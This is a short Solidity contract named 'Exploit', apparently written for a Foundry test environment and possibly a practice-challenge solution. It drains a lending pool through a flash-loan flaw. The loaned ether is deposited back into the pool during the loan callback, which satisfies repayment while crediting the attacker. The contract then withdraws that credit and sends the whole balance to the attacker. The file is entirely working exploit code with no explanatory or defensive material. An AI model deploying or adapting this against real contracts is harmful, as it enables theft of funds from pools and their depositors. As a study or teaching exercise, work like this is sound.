// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/console.sol";

contract Exploit {
    function execute() external payable {
        console.log(1);
        address(msg.sender).call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
    }

    function attack(uint256 amount, address poolAddress) external payable {
        address(poolAddress).call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        address(poolAddress).call(abi.encodeWithSignature("withdraw()"));
        //transfer all eth to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
